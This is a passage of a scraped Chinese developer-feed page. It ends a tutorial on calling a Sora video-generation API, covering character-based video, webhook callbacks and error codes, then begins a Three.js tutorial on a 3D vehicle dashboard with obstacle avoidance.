      <span class="hljs-string">"video_url"</span>: <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777af4hfmg9g7yfvwsc6zws%2Ftask_01k777af4hfmg9g7yfvwsc6zws_genid_92bae0c5-1703-4a5f-9d9f-c9ed2f9e7176_25_10_10_14_12_924695%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A37%3A32Z&amp;se=2025-10-16T13%3A37%3A32Z&amp;sks=b&amp;skt=2025-10-10T12%3A37%3A32Z&amp;ske=2025-10-16T13%3A37%3A32Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=5j4dibeaSsDmEka5c%2B9CKHZhRPdqfClQ0tIh03TWXsM%3D&amp;az=oaivgprodscus"</span>,
      <span class="hljs-string">"state"</span>: <span class="hljs-string">"succeeded"</span>
    }
  ]
}
</code></pre>
<p>可以看到，生成的效果是图生建视频的，结果与上文类似。</p>
<h2 data-id="heading-3">角色生成视频任务</h2>
<p>如果想角色生成视频任务， 首先参数<code>character_url</code>必须传入创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败，就可以指定如下内容：</p>
<ul>
<li>character_url：创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08afdd239beb4c33993784b7a981c9ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=o4VBn6f4BetYILLX%2BARHY9gHzmU%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bd36ec3ee3f450fa688081c73b45901~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=CCqAN4pQbnJnFU4eAiF%2BS0I9QPA%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"small"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">10</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"character_url"</span>: <span class="hljs-string">"https://cdn.acedata.cloud/pdidf5.mp4"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"character_end"</span>: <span class="hljs-number">3</span>,
    <span class="hljs-string">"character_start"</span>: <span class="hljs-number">1</span>
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"d9bf5461-29b5-47fd-be90-1fe9197df259"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b7992643-9207-40d6-956b-7577728acc67"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k8ykrztefavaypw6xanw305b"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/cdn/20251101/bee4eeeb4c4660b46dac4548a1ffbc.mp4"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>可以看到，生成的效果是角色生成视频，结果与上文类似。</p>
<h2 data-id="heading-4">异步回调</h2>
<p>由于 Sora Videos Generation API生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
<p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成视频的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
<p>下面我们通过示例来了解下具体怎样操作。</p>
<p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebhook.site%2F%25EF%25BC%258C%25E6%2589%2593%25E5%25BC%2580%25E8%25AF%25A5%25E7%25BD%2591%25E7%25AB%2599%25E5%258D%25B3%25E5%258F%25AF%25E5%25BE%2597%25E5%2588%25B0%25E4%25B8%2580%25E4%25B8%25AA" target="_blank" title="https://webhook.site/%EF%BC%8C%E6%89%93%E5%BC%80%E8%AF%A5%E7%BD%91%E7%AB%99%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA" ref="nofollow noopener noreferrer">webhook.site/，打开该网站即可得到一…</a> Webhook URL，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b018c4227e9841b09245cd122add7c4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=PGxEgyrxL2Z8f5qhaYk5ZPERNvk%3D" alt="" loading="lazy"/></p>
<p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code>。</p>
<p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47575b3f81444498ebcfd4db4f45b34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=dUWZxWGc7%2FCRWph5M%2FEwEMEyUes%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>稍等片刻，我们可以在 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code> 上观察到生成歌曲的结果，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d3f995391c948da9158e75b12fbb352~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=is6vBxRfrLI5ZHDeVO3UdsIF%2BxU%3D" alt="" loading="lazy"/></p>
<p>内容如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fb751e1e-4705-49ea-9fd4-5024b7865ea2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k777hjrbfrgs2060q5zvf2a5"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777hjrbfrgs2060q5zvf2a5%2Ftask_01k777hjrbfrgs2060q5zvf2a5_genid_b8e2e5d1-a579-49ca-a21c-cb3869685cce_25_10_10_14_15_147334%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A38%3A49Z&amp;se=2025-10-16T13%3A38%3A49Z&amp;sks=b&amp;skt=2025-10-10T12%3A38%3A49Z&amp;ske=2025-10-16T13%3A38%3A49Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=p4aMqXqkP%2FI1IhOVGCB9JL8vUUvfNBBF12ESpKhKXOk%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
<h2 data-id="heading-5">错误处理</h2>
<p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
<ul>
<li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
<li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
<li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
</ul>
<h3 data-id="heading-6">错误响应示例</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_error"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fetch failed"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-7">结论</h2>
<p>通过本文档，您已经了解了如何使用 Sora Videos Generation API 可通过输入提示词以及参考图片来生成视频。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于ThreeJs实现3D车机大屏及自动避障效果]]></title>    <link>https://juejin.cn/post/7603221478473646122</link>    <guid>https://juejin.cn/post/7603221478473646122</guid>    <pubDate>2026-02-05T14:00:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473646122" data-draft-id="7603142147643572267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于ThreeJs实现3D车机大屏及自动避障效果"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T14:00:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李剑一"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于ThreeJs实现3D车机大屏及自动避障效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李剑一
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:00:28.000Z" title="Thu Feb 05 2026 14:00:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>之前接到一个需求，说是给某个无人车做个啥配套的演示代码，但是仅仅只是提供一个Demo，所以细节上很多地方并没有深究。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7112cb42579e4b0894d518b1b2309240~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904828&amp;x-signature=AttdCqs5lTzXxaC7GQikD4L2MSc%3D" alt="无标题视频——使用Clipchamp制作.gif" loading="lazy"/></p>
<p>不过虽然仅仅是一个Demo，但是其核心的功能基本都实现了：</p>
<ul>
<li>道路生成</li>
<li>道路上障碍物生成（包括固定障碍物、车辆等）</li>
<li>车辆行进效果展示</li>
<li>避障道路切换展示</li>
</ul>
<h2 data-id="heading-0">实现方案</h2>
<p>使用Three.js实现3D车机大屏效果，先安装 <code>Three.js</code></p>
<pre><code class="hljs language-bash" lang="bash">pnpm install three
</code></pre>
<p>我这里使用的版本是 <code>v0.150.1</code>。</p>
<h3 data-id="heading-1">初始化场景</h3>
<p>通过 <code>THREE.Scene()</code> 对象生成简单的背景，以及环境光部分。</p>
<p>注意：环境光如果没有特殊的需求用默认的也没问题。</p>
<pre><code class="hljs language-js" lang="js">scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>()
scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0xE8E8E8</span>)

<span class="hljs-comment">// 添加环境光</span>
<span class="hljs-comment">// const ambientLight = new THREE.AmbientLight(0xffffff, 0.8)</span>
<span class="hljs-comment">// scene.add(ambientLight)</span>
</code></pre>
<p>初始化部分直接创建渲染器：</p>
<pre><code class="hljs language-js" lang="js">renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> })
renderer.<span class="hljs-title function_">setSize</span>(rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>)
renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>)
renderer.<span class="hljs-property">shadowMap</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 避免proxy错误</span>
rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>)
</code></pre>
<h3 data-id="heading-2">创建道路</h3>
<p>通过 <code>THREE.PlaneGeometry</code> 对象创建道路，这里我是直接写死的，因为不牵扯屏幕适配问题。</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">const</span> roadGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">24</span>, <span class="hljs-number">200</span>)  <span class="hljs-comment">// 参数分别是 width / height</span>
<span class="hljs-keyword">const</span> roadMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x555555</span> })
road = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(roadGeometry, roadMaterial)
road.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
scene.<span class="hljs-title function_">add</span>(road)
</code></pre>
<p>增加车道标线，这里我不是分开创建的，而是统一创建完以后再划分。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> lineGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.15</span>, <span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> lanePositions = [-<span class="hljs-number">8</span>, -<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>] <span class="hljs-comment">// 5条车道分隔线，形成6个车道</span>
lanePositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = -<span class="hljs-number">50</span>; i &lt; <span class="hljs-number">50</span>; i += <span class="hljs-number">4</span>) { <span class="hljs-comment">// 虚线间隔</span>
        <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(lineGeometry, dashedLineMaterial)
        line.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(x, <span class="hljs-number">0.01</span>, i)
        line.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
        scene.<span class="hljs-title function_">add</span>(line)
    }
})
</code></pre>
<h3 data-id="heading-3">创建车辆</h3>
<p>这里需要注意，一般来说更建议使用具体的车辆模型进行展示，效果更好。</p>
<p>这里因为我确实是没找到合适的车辆模型，就简单画了一个。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> carGroup = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
<span class="hljs-comment">// 车身</span>
<span class="hljs-keyword">const</span> bodyGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(body)
<span class="hljs-comment">// 车窗</span>
<span class="hljs-keyword">const</span> windowGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1.8</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">2</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">window</span>)
<span class="hljs-comment">// 车轮</span>
